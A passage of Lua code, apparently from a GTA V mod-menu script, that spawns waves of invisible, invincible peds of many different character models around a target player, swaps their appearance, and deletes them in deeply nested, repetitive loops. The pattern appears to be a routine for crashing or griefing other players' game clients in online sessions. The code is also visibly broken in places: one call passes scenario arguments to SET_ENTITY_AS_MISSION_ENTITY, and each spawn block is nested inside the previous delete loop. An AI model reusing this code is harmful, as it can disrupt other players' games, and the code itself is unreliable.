                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds6[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds6[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds6[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds6[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds6[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds6[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds6[i], 3, 0, 1, 0)
                util.yield()
            end
            util.yield(500)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds6[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_debra")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds7 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds7[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds7[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds7[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds7[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds7[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds7[i], 4, 0, 1, 0)
                util.yield()
            end
            util.yield(500)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds7[i])
                util.yield(5)
                local pedhash = util.joaat("cs_devin")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds8 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds8[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds8[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds8[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds8[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds8[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds8[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds8[i], 3, 1, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds8[i])
                    util.yield(5)
                    local pedhash = util.joaat("cs_guadalope")
                    while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                        STREAMING.REQUEST_MODEL(pedhash)
                        util.yield(10)
                    end
                    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                    local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                    SpawnedPeds9 = {}
                    local ped_amount = math_random(7, 10)
                    for i = 1, ped_amount do
                        local pedtype = 0
                        local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                        local coords = PlayerPedCoords
                        local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                        coords.x = coords.x
                        coords.y = coords.y
                        coords.z = coords.z
                        if loc1 == 1 then
                            coords.x = coords.x - math_random(1, 5)
                        else
                            coords.x = coords.x + math_random(1, 5)
                        end
                        if loc2 == 1 then
                            coords.y = coords.y - math_random(1, 5)
                        else
                            coords.y = coords.y + math_random(1, 5)
                        end
                        if loc3 == 1 then
                            coords.z = coords.z - math_random(3, 5)
                        else
                            coords.z = coords.z + math_random(3, 5)
                        end
                        if pedt == 1 then
                            pedtype = 0
                        else
                            pedtype = 3
                        end
                        SpawnedPeds9[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds9[i], true, true)
                        TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds9[i], "Walk_Facility", 0, false)
                        ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds9[i], true)
                        ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds9[i], false)
                        util.yield(5)
                    end
                    for i = 1, ped_amount do
                        ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds9[i], true)
                        PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds9[i], 3, 0, 1, 0)
                        util.yield()
                    end
                    util.yield(500)
                    for i = 1, ped_amount do
                        entities.delete(SpawnedPeds9[i])
                        util.yield(5)
                        local pedhash = util.joaat("cs_gurk")
                        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                            STREAMING.REQUEST_MODEL(pedhash)
                            util.yield(10)
                        end
                        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                        SpawnedPeds10 = {}
                        local ped_amount = math_random(7, 10)
                        for i = 1, ped_amount do
                            local pedtype = 0
                            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                            local coords = PlayerPedCoords
                            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                            coords.x = coords.x
                            coords.y = coords.y
                            coords.z = coords.z
                            if loc1 == 1 then
                                coords.x = coords.x - math_random(1, 5)
                            else
                                coords.x = coords.x + math_random(1, 5)
                            end
                            if loc2 == 1 then
                                coords.y = coords.y - math_random(1, 5)
                            else
                                coords.y = coords.y + math_random(1, 5)
                            end
                            if loc3 == 1 then
                                coords.z = coords.z - math_random(3, 5)
                            else
                                coords.z = coords.z + math_random(3, 5)
                            end
                            if pedt == 1 then
                                pedtype = 0
                            else
                                pedtype = 3
                            end
                            SpawnedPeds10[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds10[i], true, true)
                            TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds10[i], "Walk_Facility", 0, false)
                            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds10[i], true)
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds10[i], false)
                            util.yield(5)
                        end
                        for i = 1, ped_amount do
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds10[i], true)
                            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds10[i], 3, 0, 1, 0)
                            util.yield()
                        end
                        util.yield(500)
                        for i = 1, ped_amount do
                            entities.delete(SpawnedPeds10[i])
                            util.yield(5)
                            local pedhash = util.joaat("cs_jimmydisanto")
                            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                                STREAMING.REQUEST_MODEL(pedhash)
                                util.yield(10)
                            end
                            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                            SpawnedPeds11 = {}
                            local ped_amount = math_random(7, 10)
                            for i = 1, ped_amount do
                                local pedtype = 0
                                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                                local coords = PlayerPedCoords
                                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                                coords.x = coords.x
                                coords.y = coords.y
                                coords.z = coords.z
                                if loc1 == 1 then
                                    coords.x = coords.x - math_random(1, 5)
                                else
                                    coords.x = coords.x + math_random(1, 5)
                                end
                                if loc2 == 1 then
                                    coords.y = coords.y - math_random(1, 5)
                                else
                                    coords.y = coords.y + math_random(1, 5)
                                end
                                if loc3 == 1 then
                                    coords.z = coords.z - math_random(3, 5)
                                else
                                    coords.z = coords.z + math_random(3, 5)
                                end
                                if pedt == 1 then
                                    pedtype = 0
                                else
                                    pedtype = 3
                                end
                                SpawnedPeds11[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds11[i], true, true)
                                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds11[i], "Walk_Facility", 0, false)
                                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds11[i], true)
                                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds11[i], false)
                                util.yield(5)
                            end
                            for i = 1, ped_amount do
                                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds11[i], true)
                                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds11[i], 3, 2, 1, 0)
                                util.yield()
                            end
                            util.yield(500)
                            for i = 1, ped_amount do
                                entities.delete(SpawnedPeds11[i])
                                util.yield(5)
                            end
                            local pedhash = util.joaat("cs_josh")
                            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                                STREAMING.REQUEST_MODEL(pedhash)
                                util.yield(10)
                            end
                            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                            SpawnedPeds12 = {}
                            local ped_amount = math_random(7, 10)
                            for i = 1, ped_amount do
                                local pedtype = 0
                                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                                local coords = PlayerPedCoords
                                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                                coords.x = coords.x
                                coords.y = coords.y
                                coords.z = coords.z
                                if loc1 == 1 then
                                    coords.x = coords.x - math_random(1, 5)
                                else
                                    coords.x = coords.x + math_random(1, 5)
                                end
                                if loc2 == 1 then
                                    coords.y = coords.y - math_random(1, 5)
                                else
                                    coords.y = coords.y + math_random(1, 5)
                                end
                                if loc3 == 1 then
                                    coords.z = coords.z - math_random(3, 5)
                                else
                                    coords.z = coords.z + math_random(3, 5)
                                end
                                if pedt == 1 then
                                    pedtype = 0
                                else
                                    pedtype = 3
                                end
                                SpawnedPeds12[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds12[i], true, true)
                                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds12[i], "Walk_Facility", 0, false)
                                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds12[i], true)
                                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds12[i], false)
                                util.yield(5)
                            end
                            for i = 1, ped_amount do
                                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds12[i], true)
                                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds12[i], 3, 0, 1, 0)
                                util.yield()
                            end
                            util.yield(500)
                            for i = 1, ped_amount do
                                entities.delete(SpawnedPeds12[i])
                                util.yield(5)
                            end
                            local pedhash = util.joaat("cs_lamardavis")
                            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                                STREAMING.REQUEST_MODEL(pedhash)
                                util.yield(10)
                            end
                            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                            SpawnedPeds13 = {}
                            local ped_amount = math_random(7, 10)
                            for i = 1, ped_amount do
                                local pedtype = 0
                                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                                local coords = PlayerPedCoords
                                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                                coords.x = coords.x
                                coords.y = coords.y
                                coords.z = coords.z
                                if loc1 == 1 then
                                    coords.x = coords.x - math_random(1, 5)
                                else
                                    coords.x = coords.x + math_random(1, 5)
                                end
                                if loc2 == 1 then
                                    coords.y = coords.y - math_random(1, 5)
                                else
                                    coords.y = coords.y + math_random(1, 5)
                                end
                                if loc3 == 1 then
                                    coords.z = coords.z - math_random(3, 5)
                                else
                                    coords.z = coords.z + math_random(3, 5)
                                end
                                if pedt == 1 then
                                    pedtype = 0
                                else
                                    pedtype = 3
                                end
                                SpawnedPeds13[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds13[i], true, true)
                                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds13[i], "Walk_Facility", 0, false)
                                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds13[i], true)
                                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds13[i], false)
                                util.yield(5)
                            end
                            for i = 1, ped_amount do
                                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds13[i], true)
                                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds13[i], 3, 2, 3, 0 )
                                util.yield()
                            end
                            util.yield(500)
                            for i = 1, ped_amount do
                                entities.delete(SpawnedPeds13[i])
                                util.yield(5)
                            end
                            local pedhash = util.joaat("cs_lestercrest")
                            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                                STREAMING.REQUEST_MODEL(pedhash)
                                util.yield(10)
                            end
                            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                            SpawnedPeds14 = {}
                            local ped_amount = math_random(7, 10)
                            for i = 1, ped_amount do
                                local pedtype = 0
                                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                                local coords = PlayerPedCoords
                                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                                coords.x = coords.x
                                coords.y = coords.y
                                coords.z = coords.z
                                if loc1 == 1 then
                                    coords.x = coords.x - math_random(1, 5)
                                else
                                    coords.x = coords.x + math_random(1, 5)
                                end
                                if loc2 == 1 then
                                    coords.y = coords.y - math_random(1, 5)
                                else
                                    coords.y = coords.y + math_random(1, 5)
                                end
                                if loc3 == 1 then
                                    coords.z = coords.z - math_random(3, 5)
                                else
                                    coords.z = coords.z + math_random(3, 5)
                                end
                                if pedt == 1 then
                                    pedtype = 0
                                else
                                    pedtype = 3
                                end
                                SpawnedPeds14[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds14[i], true, true)
                                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds14[i], "Walk_Facility", 0, false)
                                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds14[i], true)
                                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds14[i], false)
                                util.yield(5)
                            end
                            for i = 1, ped_amount do
                                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds14[i], true)
                                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds14[i], 11, 2, 1, 0)
                                util.yield()
                            end
                            util.yield(500)
                            for i = 1, ped_amount do
                                entities.delete(SpawnedPeds14[i])
                                util.yield(5)
                            end
                            local pedhash = util.joaat("cs_lestercrest_3")
                            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                                STREAMING.REQUEST_MODEL(pedhash)
                                util.yield(10)
                            end
                            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                            SpawnedPeds15 = {}
                            local ped_amount = math_random(7, 10)
                            for i = 1, ped_amount do
                                local pedtype = 0
                                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                                local coords = PlayerPedCoords
                                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                                coords.x = coords.x
                                coords.y = coords.y
                                coords.z = coords.z
                                if loc1 == 1 then
                                    coords.x = coords.x - math_random(1, 5)
                                else
                                    coords.x = coords.x + math_random(1, 5)
                                end
                                if loc2 == 1 then
                                    coords.y = coords.y - math_random(1, 5)
                                else
                                    coords.y = coords.y + math_random(1, 5)
                                end
                                if loc3 == 1 then
                                    coords.z = coords.z - math_random(3, 5)
                                else
                                    coords.z = coords.z + math_random(3, 5)
                                end
                                if pedt == 1 then
                                    pedtype = 0
                                else
                                    pedtype = 3
                                end
                                SpawnedPeds15[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds15[i], true, true)
                                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds15[i], "Walk_Facility", 0, false)
                                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds15[i], true)
                                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds15[i], false)
                                util.yield(5)
                            end
                            for i = 1, ped_amount do
                                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds15[i], true)
                                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds15[i], 3, 2, 1, 0)
                                util.yield()
                            end
                            util.yield(500)
                            for i = 1, ped_amount do
                                entities.delete(SpawnedPeds15[i])
                                util.yield(5)
                            end
                            local pedhash = util.joaat("cs_martinmadrazo")
                            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                                STREAMING.REQUEST_MODEL(pedhash)
                                util.yield(10)
                            end
                            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                            SpawnedPeds16 = {}
                            local ped_amount = math_random(7, 10)
                            for i = 1, ped_amount do
                                local pedtype = 0
                                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                                local coords = PlayerPedCoords
                                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                                coords.x = coords.x
                                coords.y = coords.y
                                coords.z = coords.z
                                if loc1 == 1 then
                                    coords.x = coords.x - math_random(1, 5)
                                else
                                    coords.x = coords.x + math_random(1, 5)
                                end
                                if loc2 == 1 then
                                    coords.y = coords.y - math_random(1, 5)
                                else
                                    coords.y = coords.y + math_random(1, 5)
                                end
                                if loc3 == 1 then
                                    coords.z = coords.z - math_random(3, 5)
                                else
                                    coords.z = coords.z + math_random(3, 5)
                                end
                                if pedt == 1 then
                                    pedtype = 0
                                else
                                    pedtype = 3
                                end
                                SpawnedPeds16[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds16[i], true, true)
                                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds16[i], "Walk_Facility", 0, false)
                                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds16[i], true)
                                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds16[i], false)
                                util.yield(5)
                            end
                            for i = 1, ped_amount do
                                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds16[i], true)
                                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds16[i], 3, 0, 1, 0)
                                util.yield()
                            end
                            util.yield(500)
                            for i = 1, ped_amount do
                                entities.delete(SpawnedPeds16[i])
                                util.yield(5)
                            end
                            local pedhash = util.joaat("cs_milton")
                            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                                STREAMING.REQUEST_MODEL(pedhash)
                                util.yield(10)
                            end
                            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                            SpawnedPeds17 = {}
                            local ped_amount = math_random(7, 10)
                            for i = 1, ped_amount do
                                local pedtype = 0
                                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                                local coords = PlayerPedCoords
                                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                                coords.x = coords.x
                                coords.y = coords.y
                                coords.z = coords.z
                                if loc1 == 1 then
                                    coords.x = coords.x - math_random(1, 5)
                                else
                                    coords.x = coords.x + math_random(1, 5)
                                end
                                if loc2 == 1 then
                                    coords.y = coords.y - math_random(1, 5)
                                else
                                    coords.y = coords.y + math_random(1, 5)
                                end
                                if loc3 == 1 then
                                    coords.z = coords.z - math_random(3, 5)
                                else
                                    coords.z = coords.z + math_random(3, 5)
                                end
                                if pedt == 1 then
                                    pedtype = 0
                                else
                                    pedtype = 3
                                end
                                SpawnedPeds17[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds17[i], true, true)
                                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds17[i], "Walk_Facility", 0, false)
                                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds17[i], true)
                                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds17[i], false)
                                util.yield(5)
                            end
                            for i = 1, ped_amount do
                                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds17[i], true)
                                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds17[i], 3, 0, 1, 0)
                                util.yield()
                            end
                            util.yield(500)
                            for i = 1, ped_amount do
                                entities.delete(SpawnedPeds17[i])
                                util.yield(5)
                            end
                            local pedhash = util.joaat("cs_molly")
                            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                                STREAMING.REQUEST_MODEL(pedhash)
                                util.yield(10)
                            end
                            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                            SpawnedPeds18 = {}
                            local ped_amount = math_random(7, 10)
                            for i = 1, ped_amount do
                                local pedtype = 0
                                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                                local coords = PlayerPedCoords
                                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                                coords.x = coords.x
                                coords.y = coords.y
                                coords.z = coords.z
                                if loc1 == 1 then
                                    coords.x = coords.x - math_random(1, 5)
                                else
                                    coords.x = coords.x + math_random(1, 5)
                                end
                                if loc2 == 1 then
                                    coords.y = coords.y - math_random(1, 5)
                                else
                                    coords.y = coords.y + math_random(1, 5)
                                end
                                if loc3 == 1 then
                                    coords.z = coords.z - math_random(3, 5)
                                else
                                    coords.z = coords.z + math_random(3, 5)
                                end
                                if pedt == 1 then
                                    pedtype = 0
                                else
                                    pedtype = 3
                                end
                                SpawnedPeds18[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds18[i], true, true)
                                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds18[i], "Walk_Facility", 0, false)
                                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds18[i], true)
                                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds18[i], false)
                                util.yield(5)
                            end
                            for i = 1, ped_amount do
                                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds18[i], true)
                                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds18[i], 4, 1, 3, 0)
                                util.yield()
                            end
                            util.yield(500)
                            for i = 1, ped_amount do
                                entities.delete(SpawnedPeds18[i])
                                util.yield(5)
                            end
                            local pedhash = util.joaat("cs_mrs_thornhill")
                            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                                STREAMING.REQUEST_MODEL(pedhash)
                                util.yield(10)
                            end
                            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                            SpawnedPeds19 = {}
                            local ped_amount = math_random(7, 10)
                            for i = 1, ped_amount do
                                local pedtype = 0
                                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                                local coords = PlayerPedCoords
                                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                                coords.x = coords.x
                                coords.y = coords.y
                                coords.z = coords.z
                                if loc1 == 1 then
                                    coords.x = coords.x - math_random(1, 5)
                                else
                                    coords.x = coords.x + math_random(1, 5)
                                end
                                if loc2 == 1 then
                                    coords.y = coords.y - math_random(1, 5)
                                else
                                    coords.y = coords.y + math_random(1, 5)
                                end
                                if loc3 == 1 then
                                    coords.z = coords.z - math_random(3, 5)
                                else
                                    coords.z = coords.z + math_random(3, 5)
                                end
                                if pedt == 1 then
                                    pedtype = 0
                                else
                                    pedtype = 3
                                end
                                SpawnedPeds19[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds19[i], true, true)
                                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds19[i], "Walk_Facility", 0, false)
                                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds19[i], true)
                                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds19[i], false)
                                util.yield(5)
                            end
                            for i = 1, ped_amount do
                                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds19[i], true)
                                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds19[i], 3, 0, 1, 0)
                                util.yield()
                            end
                            util.yield(500)
                            for i = 1, ped_amount do
                                entities.delete(SpawnedPeds19[i])
                                util.yield(5)
                            end
                            local pedhash = util.joaat("cs_nigel")
                            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                                STREAMING.REQUEST_MODEL(pedhash)
                                util.yield(10)
                            end
                            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                            SpawnedPeds20 = {}
                            local ped_amount = math_random(7, 10)
                            for i = 1, ped_amount do
                                local pedtype = 0
                                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                                local coords = PlayerPedCoords
                                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                                coords.x = coords.x
                                coords.y = coords.y
                                coords.z = coords.z
                                if loc1 == 1 then
                                    coords.x = coords.x - math_random(1, 5)
                                else
                                    coords.x = coords.x + math_random(1, 5)
                                end
                                if loc2 == 1 then
                                    coords.y = coords.y - math_random(1, 5)
                                else
                                    coords.y = coords.y + math_random(1, 5)
                                end
                                if loc3 == 1 then
                                    coords.z = coords.z - math_random(3, 5)
                                else
                                    coords.z = coords.z + math_random(3, 5)
                                end
                                if pedt == 1 then
                                    pedtype = 0
                                else
                                    pedtype = 3
                                end
                                SpawnedPeds20[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds20[i], true, true)
                                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds20[i], "Walk_Facility", 0, false)
                                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds20[i], true)
                                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds20[i], false)
                                util.yield(5)
